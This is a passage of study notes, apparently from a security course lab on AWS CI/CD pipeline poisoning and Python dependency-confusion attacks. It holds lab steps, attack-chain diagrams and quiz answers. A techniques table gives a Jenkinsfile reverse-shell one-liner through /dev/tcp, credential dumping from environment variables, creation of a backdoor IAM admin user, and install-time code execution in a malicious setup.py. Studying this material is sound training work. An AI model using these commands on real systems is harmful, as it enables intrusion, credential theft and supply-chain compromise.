- Q3: `C. S3 Explorer`

> 🚩 Hands-on, VM spin-up required: Find the flag in one of the S3 buckets accessible with the `stolen-s3` credentials. ⬜ Pending

#### 26.10.5-6. Escalating to Admin via Terraform State

```bash
# List the Terraform state bucket
aws --profile=stolen-s3 s3 ls tf-state-<SUFFIX>
# terraform.tfstate

# Download it
aws --profile=stolen-s3 s3 cp s3://tf-state-<SUFFIX>/terraform.tfstate ./
cat terraform.tfstate
```

State file contains:
- `user_list`: three users with policy ARNs (Goran.B = AdministratorAccess, others = ReadOnlyAccess)
- `resources`: access key IDs and secrets for each user in plaintext

Configure Goran.B's profile:
```bash
aws configure --profile=goran.b
# enter ID and secret from state file

aws --profile=goran.b iam list-attached-user-policies --user-name goran.b
# AdministratorAccess confirmed = full compromise
```

> 🔍 Worth remembering generally: Terraform state files are plaintext JSON containing every resource attribute, including secrets, access keys, and passwords for anything Terraform provisioned. Writable or public S3 buckets storing state files are a critical finding in any cloud assessment.

**Quiz answers (pure recall):**
- Q1: `C. List and read permissions`
- Q2: `B. Usernames and their associated AWS policies`

> 🚩 Hands-on, VM spin-up required: Find the flag in an EC2 instance tag using the admin credentials (Goran.B profile). ⬜ Pending

---

## Attack Chain Diagrams

### Part 1: Poisoned Pipeline

```mermaid
flowchart TD
    A[S3 bucket\nPublic-accessible] --> B[aws s3 ls\ncross-account auth bypass]
    B --> C[.git directory\nfull repo in bucket]
    C --> D[git show\nFix issue commit]
    D --> E[base64 decode\nadmin credentials]
    E --> F[Gitea admin\nauthenticated]
    F --> G[Edit Jenkinsfile\nwithAWS + sh payload]
    G --> H[Git push\nwebhook fires]
    H --> I[Jenkins pipeline\nruns poisoned file]
    I --> J[Reverse shell\non builder]
    J --> K[env: AWS_ACCESS_KEY_ID\nAWS_SECRET_ACCESS_KEY]
    K --> L[Backdoor IAM user\nAdministratorAccess]
```

### Part 2: Dependency Chain

```mermaid
flowchart TD
    A[OSINT: forum post\nhackshort-util not on PyPI] --> B[Build malicious package\nversion 1.1.4]
    B --> C[Publish to\npypi.offseclab.io]
    C --> D[Production rebuild\npip extra-index-url confusion]
    D --> E[Python meterpreter\non production root]
    E --> F[netscan.py\n172.30.0.30:8080 found]
    F --> G[Jenkins self-reg\ncreate account]
    G --> H[S3 Explorer plugin\nAWS creds in HTML source]
    H --> I[s3api list-buckets\ntf-state bucket found]
    I --> J[terraform.tfstate\nplaintext secrets]
    J --> K[Goran.B keys\nAdministratorAccess]
```

---

## Key Techniques Reference

| Technique | Command/Tool | Key Detail |
|-----------|-------------|-----------|
| S3 cross-account read | `aws s3 ls <bucket>` | AuthenticatedUsers ACL = any AWS user, not same-account only |
| Git history secret hunt | `git log` + `git show <hash>` | gitleaks misses diff-removed lines; check "Fix" commits manually |
| Pipeline credential steal | Jenkinsfile `withAWS` + `sh 'env \| grep AWS'` | Creds loaded as env vars inside the block |
| Reverse shell in Jenkinsfile | `sh 'bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1" &'` | Must use `sh`, not Groovy; `&` to background |
| Backdoor IAM | `iam create-user` + `attach-user-policy` | ARN: `arn:aws:iam::aws:policy/AdministratorAccess` |
| Dep chain version | `~=1.1.0` needs `>=1.1.1, <1.2.0` | Must be higher but compatible; `1.1.4` works |
| Install-time code exec | `cmdclass={'install': Installer}` in `setup.py` | Fires at `pip install`, not at import |
| Import-time code exec | `__getattr__` + `sys.excepthook` in `utils.py` | Fires on `from pkg import utils`; suppresses crash |
| Publish package | `twine upload --repository-url <url>` | Needs `~/.pypirc` or inline `-u/-p` flags |
| Container pivot scan | `netscan.py` via meterpreter upload | Uses only stdlib `socket`/`ipaddress`/`sys` |
| MSF pivot chain | SOCKS proxy + `route add` + SSH `-L` | `route add <network> <mask> <session_id>` |
| Jenkins plugin vuln | S3 Explorer | AWS creds in hidden `<input>` fields, readable in page source |
| Terraform state exfil | `aws s3 cp s3://tf-state-<x>/terraform.tfstate ./` | Plaintext: user ARNs, key IDs, secrets |

---

## External Resources

> 📎 **OWASP Top 10 CI/CD Security Risks:** https://owasp.org/www-project-top-10-ci-cd-security-risks/, canonical reference for all CICD-SEC-x identifiers used in this module

> 📎 **PayloadsAllTheThings:** https://github.com/swisskyrepo/PayloadsAllTheThings, covers Python package injection, pipeline attacks, and cloud enumeration chains

> 📎 **HackTricks Jenkins (via GitHub):** https://github.com/HackTricks-wiki/hacktricks/blob/master/pentesting/pentesting-web/jenkins.md. Jenkins enumeration, Groovy script console RCE, credential extraction

> 📎 **Hackingthe.cloud:** https://hackingthe.cloud. Nick Frichette's AWS-specific attack reference; covers S3 ACL misconfigs, IAM privesc, and Terraform state file attacks in depth

---

## Outstanding Sections

- [x] 26.1. About the Public Cloud Labs
- [x] 26.2. Lab Design (Part 1)
- [x] 26.3. Enumeration
- [x] 26.4. Discovering Secrets
- [x] 26.5. Poisoning the Pipeline
- [x] 26.6. Compromising the Environment (Backdoor Account)
- [x] 26.7. Lab Design (Part 2)
- [x] 26.8. Information Gathering
- [x] 26.9. Dependency Chain Attack
- [x] 26.10. Compromising the Environment (Production)
- [x] 26.11. Wrapping Up

---

## Related Boxes

**Genuine technique overlap:**
- [[HTB Inject]] — Spring Cloud Function dependency injection: a missing dependency is hijacked by a malicious file in a user-controlled path. Same conceptual chain as pip dep confusion, different language/ecosystem.
- [[HTB Bucket]] — AWS S3 cross-account access, Lambda privilege chain. Core S3 ACL misconfig patterns from Module 25 feed directly into this module's Part 1.
- [[HTB Sink]] — Gitea + Flask + AWS Secrets Manager combo. Git credential discovery and Gitea enumeration map cleanly to 26.4.2.

**Adjacent workflow (container enumeration, internal network pivot):**
- [[HTB Shoppy]] — Docker container enumeration, credential discovery in app source code, same container escape assessment pattern.
- [[HTB Registry]] — Docker registry interaction, container privilege assessment.

> ℹ️ Full CI/CD pipeline poisoning boxes are rare in public labs (HTB/PG) because they require full infrastructure: SCM server + automation server + custom app + cloud accounts. The technique is well-covered in OWASP Top 10 CI/CD and this Offsec module but rarely reproducible in single-box format. Closest public analogues: HTB Inject (dep chain concept), HTB Forge (SSRF-to-internal-service pivot mirrors the Jenkins pivot in Part 2).

---

#### Tags: #Module26 #AWS #CICD #PipelinePoisoning #DependencyChain #Jenkins #Gitea #S3 #Python #Terraform #CloudSecurity
